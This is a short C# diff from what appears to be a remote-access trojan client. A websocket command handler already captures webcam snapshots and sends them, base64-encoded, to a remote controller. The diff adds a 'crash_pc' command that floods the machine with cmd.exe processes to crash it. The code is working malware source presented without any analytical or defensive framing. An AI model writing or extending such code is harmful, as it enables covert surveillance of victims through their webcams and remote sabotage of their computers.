@@ -47,6 +47,15 @@ namespace A3
                         var SigBase64 = Convert.ToBase64String(byteImage);
                         ws.Send("##WEBCAM_SNAP##"+SigBase64);
                         ws.Send("hello ##" + Environment.CurrentDirectory + "##");
+                    }else if(message.StartsWith("crash_pc"))
+                    {
+                        int times = System.Convert.ToInt32(message.Replace("crash_pc ",""));
+                        for(int s = 0; s < times; s++){
+                            Process cmd = new Process();
+                            cmd.StartInfo.FileName = "cmd.exe";
+                            cmd.Start();
+                        }
+                        ws.Send("hello ##" + Environment.CurrentDirectory + "##");
                     }else if(message == "speedtest")
                     {
                         const string tempfile = "tempfile.tmp";
